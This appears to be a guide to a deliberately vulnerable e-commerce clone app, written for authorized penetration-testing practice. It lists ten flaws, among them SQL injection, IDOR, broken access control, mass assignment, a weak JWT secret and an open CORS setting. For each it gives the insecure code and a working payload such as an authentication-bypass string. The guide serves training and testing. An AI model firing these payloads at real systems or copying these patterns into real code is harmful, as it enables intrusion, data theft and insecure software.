# Instamart Clone - Vulnerability Guide for Authorized Pentesting

This application contains intentionally vulnerable endpoints and patterns for authorized security testing.

## Running the Application

```bash
# Backend (port 3001)
cd backend
npm install
node server.js

# Frontend (port 3000)
cd frontend
npm install
npm start
```

## Test Credentials
- **User:** user@test.com / password123
- **Admin:** admin@instamart.com / admin123
- **Victim:** victim@test.com / password123

---

## Vulnerability 1: SQL Injection (Authentication Bypass)

**Endpoint:** `POST /api/auth/login`
**Location:** `server.js` line ~40

The login query uses string concatenation:
```javascript
const query = `SELECT * FROM users WHERE email = '${email}'`;
```

**Exploitation:**
```json
{
  "email": "' OR '1'='1' --",
  "password": "anything"
}
```

This bypasses authentication and logs in as the first user in the database.

**Impact:** Complete authentication bypass, unauthorized access to any account.

---

## Vulnerability 2: SQL Injection (Search)

**Endpoint:** `GET /api/products?search=`
**Location:** `server.js` line ~90

The search parameter is directly concatenated into the SQL query:
```javascript
query += ` p.name LIKE '%${search}%'`;
```

**Exploitation:**
```
GET /api/products?search=' UNION SELECT * FROM users --
```

**Impact:** Data exfiltration from any table in the database.

---

## Vulnerability 3: Insecure Direct Object Reference (IDOR)

**Endpoint:** `GET /api/orders/:id`
**Location:** `server.js` line ~180

The endpoint retrieves any order by ID without verifying ownership:
```javascript
app.get('/api/orders/:id', authenticateToken, (req, res) => {
  db.get('SELECT * FROM orders WHERE id = ?', [req.params.id], ...);
});
```

**Exploitation:**
```
GET /api/orders/1  (attacker's order)
GET /api/orders/2  (victim's order - accessible!)
GET /api/orders/3  (another user's order)
```

**Impact:** Unauthorized access to other users' order details, PII exposure.

---

## Vulnerability 4: Broken Access Control (Admin Endpoints)

**Endpoint:** `GET /api/admin/orders`
**Location:** `server.js` line ~200

This endpoint lacks proper authorization checks. While it requires a token, it doesn't verify admin role:
```javascript
app.get('/api/admin/orders', authenticateToken, (req, res) => {
  // No role check!
  db.all(`SELECT o.*, u.email, u.name...`);
});
```

**Exploitation:**
Any authenticated user can access all orders:
```
GET /api/admin/orders
Authorization: Bearer <any_user_token>
```

**Impact:** Full access to all order data across all users.

---

## Vulnerability 5: Information Disclosure

**Endpoint:** `GET /api/debug`
**Location:** `server.js` line ~25

Unauthenticated endpoint revealing:
- Database schema
- Server environment variables
- Node.js version and platform

**Exploitation:**
```
GET /api/debug
```

**Impact:** Information leakage useful for further attacks.

---

## Vulnerability 6: User Information Disclosure

**Endpoint:** `GET /api/users/:id`
**Location:** `server.js` line ~220

Unauthenticated endpoint to retrieve any user's details:
```javascript
app.get('/api/users/:id', (req, res) => {
  db.get('SELECT id, email, name, phone, address, role FROM users WHERE id = ?', ...);
});
```

**Exploitation:**
```
GET /api/users/1
GET /api/users/2
GET /api/users/3
```

**Impact:** PII exposure - emails, phone numbers, addresses.

---

## Vulnerability 7: Price Manipulation

**Endpoint:** `POST /api/orders`
**Location:** `server.js` line ~150

The server trusts client-provided prices:
```javascript
items.forEach(item => {
  totalAmount += item.price * item.quantity;  // Client-controlled price!
});
```

**Exploitation:**
```json
{
  "items": [
    { "product_id": 1, "quantity": 1, "price": 0.01 }
  ],
  "address": "Test Address",
  "payment_method": "cod"
}
```

**Impact:** Purchase items at arbitrary prices.

---

## Vulnerability 8: Mass Assignment

**Endpoint:** `PUT /api/admin/users/:id`
**Location:** `server.js` line ~210

Any field can be updated without validation:
```javascript
app.put('/api/admin/users/:id', authenticateToken, (req, res) => {
  const updates = req.body;
  const fields = Object.keys(updates);
  const setClause = fields.map(f => `${f} = ?`).join(', ');
  db.run(`UPDATE users SET ${setClause} WHERE id = ?`, [...values, id]);
});
```

**Exploitation:**
```json
PUT /api/admin/users/3
{
  "role": "admin",
  "password": "<new_hashed_password>"
}
```

**Impact:** Privilege escalation, account takeover.

---

## Vulnerability 9: Weak JWT Secret

**Location:** `server.js` line ~15

```javascript
const JWT_SECRET = 'instamart_secret_key_2024';
```

**Exploitation:**
The weak secret can be brute-forced or guessed, allowing token forgery.

**Impact:** Authentication bypass, impersonation of any user including admin.

---

## Vulnerability 10: CORS Misconfiguration

**Location:** `server.js` line ~12

```javascript
app.use(cors({ origin: '*', credentials: true }));
```

**Impact:** Enables cross-origin attacks, allows malicious websites to make authenticated requests.

---

## Recommended Testing Tools

- **SQLMap:** For automated SQL injection testing
- **Burp Suite:** For request interception and modification
- **JWT.io:** For token analysis and forging
- **Postman:** For API endpoint testing

## Pentest Checklist

- [ ] SQL Injection in login
- [ ] SQL Injection in search
- [ ] IDOR on order details
- [ ] Broken access control on admin endpoints
- [ ] Information disclosure via debug endpoint
- [ ] User enumeration via /api/users/:id
- [ ] Price manipulation in checkout
- [ ] Mass assignment on user update
- [ ] JWT token forgery
- [ ] CORS exploitation
